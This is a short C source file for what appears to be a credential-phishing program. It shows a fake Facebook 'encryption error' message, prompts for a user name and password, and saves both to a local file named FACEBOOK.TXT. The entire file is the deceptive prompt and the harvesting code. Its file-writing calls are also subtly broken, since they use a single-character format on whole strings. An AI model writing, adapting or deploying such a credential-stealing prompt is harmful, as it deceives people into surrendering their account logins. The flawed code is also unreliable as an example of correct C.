#include <stdio.h>
#include <stdlib.h>


int main()
{
	FILE *fp;
	printf("ATTENTION:\nDue to an encryption error please re-enter the following credentials:\n");
	printf("User name/password for: www.facebook.com \(173.252.110.27)\n");
	
	char user[50];
	
	printf("User name: ");
	
	fgets ( user, 50, stdin );
	
	fp = fopen("FACEBOOK.TXT","w");
	fprintf(fp,"%c\n", user);
	
	
	char pass[50];
	
	printf("Password: ");
	
	fgets ( pass, 50, stdin );
	
	
	fprintf(fp,"%c\n", pass);
	fclose(fp);
	
	
	printf("confirming...");
	
	return 0;
}